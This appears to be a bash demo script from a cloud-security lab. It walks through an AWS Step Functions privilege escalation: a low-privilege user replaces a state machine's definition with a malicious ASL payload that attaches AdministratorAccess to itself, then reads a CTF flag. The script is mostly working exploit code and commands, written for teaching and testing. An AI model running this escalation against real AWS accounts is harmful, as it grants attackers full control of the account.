#!/bin/bash

set -e

# Demo script for stepfunctions-002 privilege escalation
# Demonstrates how a principal with states:UpdateStateMachine and states:StartExecution
# can replace an existing state machine's definition with malicious ASL that runs under
# the machine's pre-existing admin role — no iam:PassRole required.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER_NAME="pl-prod-stepfunctions-002-to-admin-starting-user"
FLAG_PARAM_NAME="/pathfinding-labs/flags/stepfunctions-002-to-admin"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}stepfunctions-002: UpdateStateMachine + StartExecution Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_stepfunctions_002_states_updatestatemachine_states_startexecution.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_USER=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
STATE_MACHINE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.state_machine_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$STATE_MACHINE_ARN" == "null" ] || [ -z "$STATE_MACHINE_ARN" ]; then
    echo -e "${RED}Error: Could not extract state machine ARN from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "State Machine ARN: $STATE_MACHINE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}"

echo -e "${YELLOW}Waiting 15 seconds for IAM propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation wait complete${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Prove starting user cannot read the SSM flag
echo -e "${YELLOW}Step 4: Confirming starting user cannot read the SSM flag (before escalation)${NC}"
echo "Attempting to read flag parameter: $FLAG_PARAM_NAME"

show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM_NAME --with-decryption --region $AWS_REGION"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --with-decryption --region "$AWS_REGION" 2>&1 || true)
echo "$PROVE_CANT_OUTPUT"

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Starting user cannot read the flag (as expected)${NC}"
else
    echo -e "${RED}✗ Unexpected: Starting user can already read the flag — check scenario permissions${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 5: Replace state machine definition with malicious ASL
echo -e "${YELLOW}Step 5: Replacing state machine definition with malicious ASL${NC}"
echo "Target state machine: $STATE_MACHINE_ARN"
echo ""
echo -e "${BLUE}Key insight: states:UpdateStateMachine does NOT require iam:PassRole when the roleArn${NC}"
echo -e "${BLUE}is left unchanged. We simply replace the definition while keeping the existing admin role.${NC}"
echo ""

# Build the malicious ASL definition using mktemp for a safe temp file
DEF_FILE=$(mktemp /tmp/pl-malicious-def-XXXXXX.json)
cat > "$DEF_FILE" <<EOF
{
  "Comment": "pl stepfunctions-002 escalation payload",
  "StartAt": "AttachAdmin",
  "States": {
    "AttachAdmin": {
      "Type": "Task",
      "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
      "Parameters": {
        "UserName": "${STARTING_USER}",
        "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      "End": true
    }
  }
}
EOF

echo -e "${YELLOW}Malicious ASL definition:${NC}"
cat "$DEF_FILE"
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker" "aws stepfunctions update-state-machine --state-machine-arn $STATE_MACHINE_ARN --definition file://$DEF_FILE --region $AWS_REGION"
UPDATE_OUTPUT=$(aws stepfunctions update-state-machine \
    --state-machine-arn "$STATE_MACHINE_ARN" \
    --definition "file://$DEF_FILE" \
    --region "$AWS_REGION" 2>&1 || true)
echo "$UPDATE_OUTPUT"

# Clean up temp file
rm -f "$DEF_FILE"

if ! echo "$UPDATE_OUTPUT" | grep -q "updateDate"; then
    echo -e "${RED}✗ UpdateStateMachine failed${NC}"
    exit 1
fi
echo -e "${GREEN}✓ State machine definition replaced with malicious ASL${NC}"

# Brief wait for the new definition to be picked up by the executor.
# 5s is sufficient for Step Functions definition propagation (different from IAM 15s default).
echo -e "${YELLOW}Waiting 5 seconds for definition to propagate...${NC}"
sleep 5
echo -e "${GREEN}✓ Definition propagation wait complete${NC}\n"

# [EXPLOIT] Step 6: Start execution to trigger the malicious ASL
echo -e "${YELLOW}Step 6: Starting execution to trigger AdministratorAccess attachment${NC}"
echo "The state machine will run as its pre-existing admin role and attach AdministratorAccess"
echo "to the starting user via the AWS SDK integration."
echo ""

show_attack_cmd "Attacker" "aws stepfunctions start-execution --state-machine-arn $STATE_MACHINE_ARN --region $AWS_REGION"
START_OUTPUT=$(aws stepfunctions start-execution \
    --state-machine-arn "$STATE_MACHINE_ARN" \
    --region "$AWS_REGION" 2>&1 || true)
echo "$START_OUTPUT"

EXECUTION_ARN=$(echo "$START_OUTPUT" | jq -r '.executionArn // empty' 2>/dev/null)
if [ -z "$EXECUTION_ARN" ]; then
    echo -e "${RED}✗ StartExecution did not return an executionArn${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Execution started: $EXECUTION_ARN${NC}"

# Wait for execution and IAM attachment to propagate.
# 30s is required for the state machine to complete and IAM to reflect the change.
echo -e "${YELLOW}Waiting 30 seconds for execution to complete and IAM attachment to propagate...${NC}"
sleep 30
echo -e "${GREEN}✓ Execution and IAM propagation wait complete${NC}\n"

# [OBSERVATION] Step 7: Verify AdministratorAccess is attached to starting user
echo -e "${YELLOW}Step 7: Verifying AdministratorAccess is now attached to starting user${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
aws iam list-attached-user-policies --user-name "$STARTING_USER" --output table 2>/dev/null || true

echo -e "${GREEN}✓ Verified policy attachment${NC}\n"

# [EXPLOIT] Step 8: Capture the CTF flag using the starting user's now-elevated credentials
echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
echo "The starting user now carries AdministratorAccess — using those same credentials."
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION

FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region $AWS_REGION"
    FLAG_VALUE=$(aws ssm get-parameter \
        --name "$FLAG_PARAM_NAME" \
        --query 'Parameter.Value' \
        --output text \
        --region "$AWS_REGION" 2>/dev/null || true)
    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $attempt: not yet readable — sleeping 10s for propagation...${NC}"
    sleep 10
done

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (only states:UpdateStateMachine + states:StartExecution)"
echo "2. Replaced the benign state machine definition with malicious ASL"
echo "   - No iam:PassRole needed — roleArn was not changed"
echo "   - The existing admin role on the state machine was already in place"
echo "3. Started an execution — the state machine ran as the admin role"
echo "4. The admin role's Step Functions SDK integration called iam:attachUserPolicy"
echo "5. AdministratorAccess was attached to the starting user"
echo "6. Starting user credentials now carry full admin access"
echo "7. Flag read: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (states:UpdateStateMachine) → malicious ASL → (states:StartExecution) → admin role executes iam:attachUserPolicy → AdministratorAccess → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- State machine definition replaced (malicious ASL now live)"

echo -e "\n${RED}⚠ Warning: AdministratorAccess is still attached to $STARTING_USER${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
